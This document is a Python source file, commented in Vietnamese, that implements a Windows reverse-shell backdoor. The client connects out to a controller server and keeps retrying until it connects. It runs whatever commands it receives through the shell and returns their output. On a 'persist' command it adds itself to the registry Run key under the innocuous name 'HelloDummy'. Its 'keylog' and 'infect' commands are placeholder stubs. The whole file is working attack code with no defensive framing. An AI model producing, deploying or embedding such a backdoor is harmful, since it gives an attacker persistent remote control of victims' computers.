import socket
import subprocess
import os
import ctypes
import time
import winreg as reg
import sys
    
def add_to_registry(sock):
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    app_name = 'HelloDummy'
    # Lấy đường dẫn đến tệp thực thi
    exe_path = os.path.abspath(sys.executable)  # Sử dụng sys.executable để lấy đường dẫn tệp .exe
    # Mở khóa Registry với quyền ghi
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as registry_key:
            # Thêm hoặc cập nhật giá trị mới
            reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, exe_path)
            response = f"Added or updated {app_name} to Registry with path: {exe_path}\n"
            time.sleep(1)
            sock.sendall(response.encode())
    except Exception as e:
        error_msg = f"Error adding to Registry: {e}\n"
        sock.sendall(error_msg.encode())

def shell(sock):
    while True:
        try:
            # Nhận dữ liệu từ server
            buffer = sock.recv(1024)
            try:
                buffer = buffer.decode('utf-8').strip()
            except UnicodeDecodeError:
                # Xử lý lỗi giải mã, có thể giữ nguyên dữ liệu nhị phân
                print("Received non-UTF-8 data")
                buffer = buffer.decode('latin-1').strip()  # Thay thế bằng bảng mã khác nếu cần

            total_response = ""
            # Xử lý lệnh thoát
            if buffer.startswith('q'):
                sock.close()
                os._exit(0)
            # Xử lý lệnh cd
            elif buffer.startswith('cd '):
                path = buffer[3:].strip()
                try:
                    os.chdir(path)
                    total_response = f"Changed directory to: {os.getcwd()}\n"
                except FileNotFoundError as e:
                    total_response = f"Error: {e}\n"
                sock.sendall(total_response.encode())
            # Xử lý lệnh keylog
            elif buffer.startswith('keylog'):
                total_response = "Keylogger is running\n"
                sock.sendall(total_response.encode())
            # Xử lý lệnh persist
            elif buffer.startswith('persist'):
                add_to_registry(sock)  # Gọi hàm để thêm vào Registry
            # Xử lý lệnh infect
            elif buffer.startswith('infect'):
                total_response = "Infection is running\n"
                sock.sendall(total_response.encode())
            # Xử lý các lệnh khác
            else:
                process = subprocess.Popen(buffer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                total_response = stdout + stderr
                sock.sendall(total_response)  # Gửi lại đầu ra dạng byte
        except socket.error as e:
            print(f"Socket error: {e}")
            break

def main():
    serv_ip = "127.0.0.1"
    serv_port = 50000
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            sock.connect((serv_ip, serv_port))
            break
        except socket.error:
            time.sleep(1)
            
    try:
        shell(sock)
    finally:
        sock.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()